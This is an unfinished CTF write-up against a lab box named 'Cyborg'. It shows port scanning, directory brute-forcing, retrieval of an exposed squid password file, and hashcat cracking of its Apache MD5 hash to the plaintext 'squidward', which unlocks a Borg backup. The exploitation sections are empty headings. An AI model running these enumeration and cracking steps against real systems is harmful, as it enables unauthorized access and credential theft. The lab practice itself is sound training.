# Web Hacking Phases
 

## Reconnaissance
### Front-End Recon
![1](1.png)
### Adding Localhost
```bash
> echo "10.10.84.7 cyborg.thm" | sudo tee -a /etc/hosts
```
### Web Application Enumeration
![admin1](admin1.png)
![admin-stack](admin-stack.png)
![admin2](admin2.png)
### Fingerprinting Web Servers
![clue](clue.png)

> 63 bytes in time to live is linux distros
```bash
> ping -c 1 cyborg.thm
PING cyborg.thm (10.10.84.7) 56(84) bytes of data.
64 bytes from cyborg.thm (10.10.84.7): icmp_seq=1 ttl=63 time=269 ms
```
### Inspecting HTTP Response Headers and Sitemaps
![archive](archive.png)
```bash
> curl 10.10.84.7 -I
HTTP/1.1 200 OK
Date: Mon, 16 Jun 2025 05:05:20 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 30 Dec 2020 09:47:13 GMT
ETag: "2c39-5b7ab644f3043"
Accept-Ranges: bytes
Content-Length: 11321
Vary: Accept-Encoding
Content-Type: text/html
```
### Technology Stack Identification
![stack](stack.png)
## Mapping and Discovery
```bash
> nmap 10.10.84.7
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 01:06 EDT
Nmap scan report for 10.10.84.7
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
### Full scan 
```bash
> nmap -sC -sV -p$(nmap -p- --min-rate=2000 -n -T4 $ip | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//') $ip -oN nmap.txt
```
```bash
# Nmap 7.95 scan initiated Mon Jun 16 01:15:01 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -p22,80 -oN nmap.txt 10.10.84.7
Nmap scan report for cyborg.thm (10.10.84.7)
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 16 01:15:19 2025 -- 1 IP address (1 host up) scanned in 17.65 seconds
```


### Directory and File Listings
```bash
> dirb http://cyborg.thm

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Jun 16 01:24:00 2025
URL_BASE: http://cyborg.thm/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://cyborg.thm/ ----
==> DIRECTORY: http://cyborg.thm/admin/                                                                                                                                     
==> DIRECTORY: http://cyborg.thm/etc/                                                                                                                                       
```
```bash
> feroxbuster -u http://cyborg.thm/ -w /usr/share/seclists/Discovery/Web-Content/big.txt --scan-dir-listings
                                                                                                                                                        
200     GET    http://cyborg.thm/icons/ubuntu-logo.png
200     GET    http://cyborg.thm/
301     GET    http://cyborg.thm/admin => http://cyborg.thm/admin/
301     GET    http://cyborg.thm/etc => http://cyborg.thm/etc/
200     GET    http://cyborg.thm/etc/squid/passwd
200     GET    http://cyborg.thm/etc/squid/squid.conf
301     GET    http://cyborg.thm/etc/squid => http://cyborg.thm/etc/squid/
```
```bash
> file archive.tar
archive.tar: POSIX tar archive (GNU)

> exiftool archive.tar
ExifTool Version Number         : 13.25
File Name                       : archive.tar
Directory                       : .
File Size                       : 1567 kB
File Modification Date/Time     : 2025:06:16 01:43:11-04:00
File Access Date/Time           : 2025:06:16 01:50:21-04:00
File Inode Change Date/Time     : 2025:06:16 01:50:10-04:00
File Permissions                : -rw-rw-r--
File Type                       : TAR
File Type Extension             : tar
MIME Type                       : application/x-tar
Warning                         : Unsupported file type
~/cyborg > 
```
```bash 
> tar -xvf archive.tar
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1
```
### Investigation unknown files 
```bash
> lsd -al 4
.rw------- kali kali 1.4 MB Tue Dec 29 09:00:38 2020  4
~/cyborg/home/field/dev/final_archive/data/0 > 
```
```bash
> tree
.
└── field
    └── dev
        └── final_archive
            ├── config
            ├── data
            │   └── 0
            │       ├── 1
            │       ├── 3
            │       ├── 4
            │       └── 5
            ├── hints.5
            ├── index.5
            ├── integrity.5
            ├── nonce
            └── README

6 directories, 11 files
~/cyborg/home > 
```
```bash
> cat README
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```
![borg](borg.png)
### Installation 
![installation](installation.png)
```bash
> sudo apt install borgbackup
```
```bash
> borg list .
Enter passphrase for key /home/kali/cyborg/home/field/dev/final_archive: 
```
> this time with need to investigate further to find password 

![squid](squid.png)
![creds](creds.png)
```bash
> curl -s http://cyborg.thm/etc/squid/passwd -o -
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
~/cyborg > 
```
```bash
> curl -s http://cyborg.thm/etc/squid/squid.conf -o -
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```
![hashtype](hashtype.png)
### Password Cracking 
```bash
> hashcat -m 1600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 5 secs

$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward           
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
Time.Started.....: Mon Jun 16 02:43:57 2025 (7 secs)
Time.Estimated...: Mon Jun 16 02:44:04 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     6205 H/s (9.81ms) @ Accel:128 Loops:250 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 39424/14344385 (0.27%)
Rejected.........: 0/39424 (0.00%)
Restore.Point....: 38912/14344385 (0.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
Candidate.Engine.: Device Generator
Candidates.#1....: treetree -> cheery
Hardware.Mon.#1..: Util: 85%

 
Stopped: Mon Jun 16 02:44:06 2025
```
```bash
> borg list .
Enter passphrase for key /home/kali/cyborg/home/field/dev/final_archive: 

music_archive                        Tue, 2020-12-29 09:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```
## Vulnerability Analysis
### Security Testing
### Enumerating APIs
### Vulnerability Identification

## Exploitation
### Post Exploitation Enumeration 
### Lateral Movement 
### Gaining Root 

## Post-Exploitation
### Flags
### Covering Tracks 

## Reporting
### Summary
